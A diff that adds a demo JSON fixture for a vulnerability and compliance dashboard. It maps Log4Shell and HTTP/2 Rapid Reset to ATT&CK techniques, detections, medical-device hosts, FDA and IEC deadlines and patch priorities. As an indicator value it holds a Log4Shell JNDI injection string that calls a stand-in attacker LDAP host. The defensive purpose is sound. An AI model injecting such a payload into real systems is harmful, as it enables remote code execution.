@@ -1,0 +1,416 @@
+{
+  "attack_chains": [
+    {
+      "cve_id": "CVE_2021_44228",
+      "cvss3": 10.0,
+      "epss": 0.97531,
+      "description": "Apache Log4j2 2.0-beta9 through 2.15.0 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers.",
+      "weaknesses": [
+        { "cwe_id": "CWE_20", "name": "Improper Input Validation", "abstraction": "Class" },
+        { "cwe_id": "CWE_400", "name": "Uncontrolled Resource Consumption", "abstraction": "Base" }
+      ],
+      "attack_techniques": [
+        {
+          "technique_id": "T1190",
+          "name": "Exploit Public-Facing Application",
+          "tactic": "initial-access",
+          "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network."
+        },
+        {
+          "technique_id": "T1059",
+          "name": "Command and Scripting Interpreter",
+          "tactic": "execution",
+          "description": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries."
+        }
+      ],
+      "live_detections": [
+        {
+          "detection_id": "det_log4shell_001",
+          "hostname": "pump-api-prod-01",
+          "technique_id": "T1190",
+          "tactic": "initial-access",
+          "severity": "critical",
+          "ioc_type": "jndi_string",
+          "ioc_value": "${jndi:ldap://attacker.corp/exploit}",
+          "detected_at": "2026-04-10T14:23:11Z",
+          "source_tool": "crowdstrike",
+          "attack_technique_matched": true,
+          "technique_name": "Exploit Public-Facing Application",
+          "soc_threshold_miss": false
+        },
+        {
+          "detection_id": "det_log4shell_002",
+          "hostname": "infusion-svc-02",
+          "technique_id": "T1059",
+          "tactic": "execution",
+          "severity": "high",
+          "ioc_type": "process_exec",
+          "ioc_value": "java -cp log4j-core.jar ...",
+          "detected_at": "2026-04-10T14:24:38Z",
+          "source_tool": "crowdstrike",
+          "attack_technique_matched": true,
+          "technique_name": "Command and Scripting Interpreter",
+          "soc_threshold_miss": true
+        }
+      ],
+      "affected_devices": [
+        {
+          "hostname": "pump-api-prod-01",
+          "internet_facing": true,
+          "containment_status": "active",
+          "compliance_tags": ["FDA_524B", "IEC_62443"]
+        },
+        {
+          "hostname": "infusion-svc-02",
+          "internet_facing": false,
+          "containment_status": "active",
+          "compliance_tags": ["IEC_62443"]
+        }
+      ],
+      "attack_chain_complete": true,
+      "spine_to_reality_hops": 4,
+      "chain_nodes": [
+        { "id": "n0", "node_type": "CVE", "label": "CVE-2021-44228", "severity": "critical" },
+        { "id": "n1", "node_type": "CWE", "label": "CWE-20\nImproper Input Validation", "severity": "high" },
+        { "id": "n2", "node_type": "Technique", "label": "T1190\nExploit Public-Facing App", "severity": "high" },
+        { "id": "n3", "node_type": "Detection", "label": "pump-api-prod-01\nCrowdStrike Alert", "severity": "critical" },
+        { "id": "n4", "node_type": "Outcome", "label": "RCE / Initial Access\nLateral Movement Risk", "severity": "critical" }
+      ],
+      "chain_edges": [
+        { "id": "e0-1", "source": "n0", "target": "n1", "probability": 0.97, "soc_threshold_miss": false },
+        { "id": "e1-2", "source": "n1", "target": "n2", "probability": 0.91, "soc_threshold_miss": true },
+        { "id": "e2-3", "source": "n2", "target": "n3", "probability": 0.85, "soc_threshold_miss": false },
+        { "id": "e3-4", "source": "n3", "target": "n4", "probability": 0.78, "soc_threshold_miss": false }
+      ]
+    },
+    {
+      "cve_id": "CVE_2023_44487",
+      "cvss3": 7.5,
+      "epss": 0.61,
+      "description": "The HTTP/2 protocol allows a denial of service (server resource consumption) because request cancellation can reset many streams quickly, as exploited in the wild in August through October 2023.",
+      "weaknesses": [
+        { "cwe_id": "CWE_400", "name": "Uncontrolled Resource Consumption", "abstraction": "Base" }
+      ],
+      "attack_techniques": [
+        {
+          "technique_id": "T1499",
+          "name": "Endpoint Denial of Service",
+          "tactic": "impact",
+          "description": "Adversaries may perform Endpoint Denial of Service attacks to degrade or block the availability of services."
+        }
+      ],
+      "live_detections": [],
+      "affected_devices": [
+        {
+          "hostname": "diag-portal-03",
+          "internet_facing": true,
+          "containment_status": "active",
+          "compliance_tags": ["FDA_524B"]
+        }
+      ],
+      "attack_chain_complete": false,
+      "spine_to_reality_hops": 2,
+      "chain_nodes": [
+        { "id": "n0", "node_type": "CVE", "label": "CVE-2023-44487", "severity": "high" },
+        { "id": "n1", "node_type": "CWE", "label": "CWE-400\nUncontrolled Resource Consumption", "severity": "medium" },
+        { "id": "n2", "node_type": "Technique", "label": "T1499\nEndpoint Denial of Service", "severity": "high" },
+        { "id": "n3", "node_type": "Outcome", "label": "Service Disruption\nFDA Device Unavailability", "severity": "high" }
+      ],
+      "chain_edges": [
+        { "id": "e0-1", "source": "n0", "target": "n1", "probability": 0.61, "soc_threshold_miss": false },
+        { "id": "e1-2", "source": "n1", "target": "n2", "probability": 0.55, "soc_threshold_miss": false },
+        { "id": "e2-3", "source": "n2", "target": "n3", "probability": 0.48, "soc_threshold_miss": false }
+      ]
+    }
+  ],
+  "threat_detections": [
+    {
+      "detection_id": "det_log4shell_001",
+      "hostname": "pump-api-prod-01",
+      "cve_id": "CVE_2021_44228",
+      "technique_id": "T1190",
+      "technique_name": "Exploit Public-Facing Application",
+      "tactic": "initial-access",
+      "severity": "critical",
+      "ioc_type": "jndi_string",
+      "ioc_value": "${jndi:ldap://attacker.corp/exploit}",
+      "quarantined": false,
+      "source_tool": "crowdstrike",
+      "detected_at": "2026-04-10T14:23:11Z",
+      "ttl_expires": "2026-04-17T14:23:11Z",
+      "cvss3": 10.0,
+      "epss": 0.97531,
+      "in_kev": true
+    },
+    {
+      "detection_id": "det_log4shell_002",
+      "hostname": "infusion-svc-02",
+      "cve_id": "CVE_2021_44228",
+      "technique_id": "T1059",
+      "technique_name": "Command and Scripting Interpreter",
+      "tactic": "execution",
+      "severity": "high",
+      "ioc_type": "process_exec",
+      "ioc_value": "java -cp log4j-core.jar ...",
+      "quarantined": false,
+      "source_tool": "crowdstrike",
+      "detected_at": "2026-04-10T14:24:38Z",
+      "ttl_expires": "2026-04-17T14:24:38Z",
+      "cvss3": 10.0,
+      "epss": 0.97531,
+      "in_kev": true
+    },
+    {
+      "detection_id": "det_h2rapid_001",
+      "hostname": "diag-portal-03",
+      "cve_id": "CVE_2023_44487",
+      "technique_id": "T1499",
+      "technique_name": "Endpoint Denial of Service",
+      "tactic": "impact",
+      "severity": "medium",
+      "ioc_type": "http2_rapid_reset",
+      "ioc_value": "RST_STREAM flood from 198.51.100.42",
+      "quarantined": false,
+      "source_tool": "waf_sentinel",
+      "detected_at": "2026-04-11T09:12:05Z",
+      "ttl_expires": null,
+      "cvss3": 7.5,
+      "epss": 0.61,
+      "in_kev": false
+    }
+  ],
+  "regulatory_deadlines": [
+    {
+      "incident_id": "inc_fda_001",
+      "native_id": "INC-2026-0041",
+      "title": "Log4Shell on pump-api-prod-01 — FDA 524B 72h reporting window",
+      "cve_id": "CVE_2021_44228",
+      "source_tool": "jira",
+      "regulatory_labels": ["FDA_524B", "IEC_62443"],
+      "sla_deadline": "2026-04-13T14:23:11Z",
+      "hours_remaining": -58,
+      "overdue": true,
+      "urgency_tier": "OVERDUE",
+      "linked_jira_key": "AQUA-441",
+      "linked_pd_incident_id": "PD-88821"
+    },
+    {
+      "incident_id": "inc_iec_002",
+      "native_id": "INC-2026-0043",
+      "title": "infusion-svc-02 execution detection — IEC 62443 patch SLA",
+      "cve_id": "CVE_2021_44228",
+      "source_tool": "jira",
+      "regulatory_labels": ["IEC_62443"],
+      "sla_deadline": "2026-04-14T14:24:38Z",
+      "hours_remaining": 6,
+      "overdue": false,
+      "urgency_tier": "CRITICAL",
+      "linked_jira_key": "AQUA-442",
+      "linked_pd_incident_id": null
+    },
+    {
+      "incident_id": "inc_fda_003",
+      "native_id": "INC-2026-0044",
+      "title": "HTTP/2 Rapid Reset on diag-portal-03 — FDA 524B monitoring",
+      "cve_id": "CVE_2023_44487",
+      "source_tool": "waf_sentinel",
+      "regulatory_labels": ["FDA_524B"],
+      "sla_deadline": "2026-04-15T09:12:05Z",
+      "hours_remaining": 31,
+      "overdue": false,
+      "urgency_tier": "HIGH",
+      "linked_jira_key": null,
+      "linked_pd_incident_id": null
+    }
+  ],
+  "patch_priority": [
+    {
+      "rank": 1,
+      "cve_id": "CVE_2021_44228",
+      "composite_score": 100,
+      "score_breakdown": {
+        "epss_pts": 29,
+        "cvss_pts": 20,
+        "kev_pts": 20,
+        "exploit_pts": 20,
+        "exposure_pts": 10
+      },
+      "cvss3": 10.0,
+      "epss": 0.97531,
+      "in_kev": true,
+      "active_exploits_in_env": 2,
+      "affected_devices": [
+        { "hostname": "pump-api-prod-01", "internet_facing": true, "containment_status": "active" },
+        { "hostname": "infusion-svc-02", "internet_facing": false, "containment_status": "active" }
+      ],
+      "internet_facing_devices": 1,
+      "open_incidents": 2,
+      "regulatory_frameworks": ["FDA_524B", "IEC_62443"],
+      "patch_urgency": "IMMEDIATE"
+    },
+    {
+      "rank": 2,
+      "cve_id": "CVE_2023_44487",
+      "composite_score": 56,
+      "score_breakdown": {
+        "epss_pts": 18,
+        "cvss_pts": 15,
+        "kev_pts": 0,
+        "exploit_pts": 20,
+        "exposure_pts": 10
+      },
+      "cvss3": 7.5,
+      "epss": 0.61,
+      "in_kev": false,
+      "active_exploits_in_env": 1,
+      "affected_devices": [
+        { "hostname": "diag-portal-03", "internet_facing": true, "containment_status": "active" }
+      ],
+      "internet_facing_devices": 1,
+      "open_incidents": 1,
+      "regulatory_frameworks": ["FDA_524B"],
+      "patch_urgency": "HIGH"
+    },
+    {
+      "rank": 3,
+      "cve_id": "CVE_2022_22965",
+      "composite_score": 41,
+      "score_breakdown": {
+        "epss_pts": 11,
+        "cvss_pts": 18,
+        "kev_pts": 0,
+        "exploit_pts": 0,
+        "exposure_pts": 10
+      },
+      "cvss3": 9.8,
+      "epss": 0.38,
+      "in_kev": false,
+      "active_exploits_in_env": 0,
+      "affected_devices": [
+        { "hostname": "data-lake-01", "internet_facing": true, "containment_status": "active" }
+      ],
+      "internet_facing_devices": 1,
+      "open_incidents": 0,
+      "regulatory_frameworks": [],
+      "patch_urgency": "MEDIUM"
+    }
+  ],
+  "ciso_situation": {
+    "posture_score": 42,
+    "posture_delta": -8,
+    "attck_coverage_pct": 34.0,
+    "attck_coverage_delta": null,
+    "remediation_sla_pct": null,
+    "control_failure_count": 3,
+    "threat_categories": [
+      {
+        "bucket_name": "initial_access",
+        "display_name": "Initial Access",
+        "breach_probability": 0.91,
+        "critical_asset_count": 3,
+        "trend": "worsening"
+      },
+      {
+        "bucket_name": "execution",
+        "display_name": "Execution",
+        "breach_probability": 0.78,
+        "critical_asset_count": 2,
+        "trend": "stable"
+      },
+      {
+        "bucket_name": "lateral_movement",
+        "display_name": "Lateral Movement",
+        "breach_probability": 0.61,
+        "critical_asset_count": 2,
+        "trend": null
+      }
+    ],
+    "control_failures": [
+      { "framework": "FDA_524B", "failure_count": 2, "coverage_pct": 54.0 },
+      { "framework": "IEC_62443", "failure_count": 1, "coverage_pct": 71.0 }
+    ],
+    "mttd_hours": 38,
+    "mttd_target_hours": 24,
+    "mttr_days": null,
+    "mttr_target_days": 7,
+    "action_priorities": [
+      {
+        "rank": 1,
+        "description": "Remediate Initial Access attack vectors (91% breach probability)",
+        "owner": "Security Engineering",
+        "due_label": "14 days",
+        "urgency": "critical"
+      },
+      {
+        "rank": 2,
+        "description": "Remediate Execution attack vectors (78% breach probability)",
+        "owner": "Security Engineering",
+        "due_label": "14 days",
+        "urgency": "critical"
+      },
+      {
+        "rank": 3,
+        "description": "Resolve FDA_524B compliance gaps (2 control failures)",
+        "owner": "GRC Team",
+        "due_label": "30 days",
+        "urgency": "medium"
+      }
+    ],
+    "snapshot_timestamp": "2026-04-15T00:00:00+00:00",
+    "data_staleness_warning": "Demo data — trigger a simulation run to compute live posture."
+  },
+  "board_situation": {
+    "breach_probability_pct": 91.0,
+    "breach_probability_delta": null,
+    "financial_exposure_usd_low": 1200000,
+    "financial_exposure_usd_high": 5100000,
+    "regulatory_fine_risk": [
+      { "framework": "FDA_524B", "estimated_fine_usd": 2500000, "probability": 0.72 },
+      { "framework": "IEC_62443", "estimated_fine_usd": 800000, "probability": 0.45 }
+    ],
+    "reputational_risk_score": 0.68,
+    "board_priorities": [
+      {
+        "rank": 1,
+        "description": "Strengthen device firmware update controls to reduce Initial Access exposure under FDA 524B",
+        "owner": "CEO",
+        "due_label": "Immediate",
+        "urgency": "critical"
+      },
+      {
+        "rank": 2,
+        "description": "Approve emergency security engineering sprint to patch KEV-affected devices",
+        "owner": "CFO",
+        "due_label": "Next board meeting",
+        "urgency": "high"
+      }
+    ],
+    "snapshot_timestamp": "2026-04-15T00:00:00+00:00"
+  },
+  "situation_metadata": {
+    "ciso": [
+      { "id": "active_chains", "label": "Active Attack Chains", "value": 2, "severity": "critical", "delta": "+2 since yesterday" },
+      { "id": "soc_blind_spots", "label": "SOC Blind Spots", "value": 1, "severity": "high", "delta": "New" },
+      { "id": "mean_chain_prob", "label": "Mean Chain Probability", "value": "0.91", "severity": "critical", "unit": "" },
+      { "id": "kev_in_env", "label": "KEV in Environment", "value": 1, "severity": "critical", "delta": "Active exploit" }
+    ],
+    "board": [
+      { "id": "ale", "label": "Annualized Loss Expectancy", "value": "$2.4M", "severity": "critical", "delta": "+$410k this quarter" },
+      { "id": "var95", "label": "VaR 95%", "value": "$5.1M", "severity": "high", "unit": "worst case" },
+      { "id": "overdue_deadlines", "label": "Overdue Regulatory Deadlines", "value": 1, "severity": "critical", "delta": "FDA 524B breach" },
+      { "id": "compliance_score", "label": "Compliance Score", "value": "61%", "severity": "medium", "delta": "-8% vs last quarter" }
+    ],
+    "engineering": [
+      { "id": "immediate_patches", "label": "IMMEDIATE Patches", "value": 1, "severity": "critical", "delta": "Log4Shell" },
+      { "id": "high_patches", "label": "HIGH Priority Patches", "value": 1, "severity": "high" },
+      { "id": "mean_epss_top10", "label": "Mean EPSS (top 10)", "value": "0.79", "severity": "high", "unit": "" },
+      { "id": "internet_exposed", "label": "Internet-Exposed Devices", "value": 3, "severity": "medium", "delta": "+1 vs last week" }
+    ],
+    "reg_affairs": [
+      { "id": "overdue", "label": "Overdue Deadlines", "value": 1, "severity": "critical", "delta": "FDA 524B" },
+      { "id": "critical_deadlines", "label": "Critical (< 24h)", "value": 1, "severity": "critical" },
+      { "id": "frameworks_at_risk", "label": "Frameworks at Risk", "value": 2, "severity": "high", "delta": "FDA, IEC 62443" },
+      { "id": "open_gap_count", "label": "Open Compliance Gaps", "value": 3, "severity": "medium" }
+    ]
+  }
+}
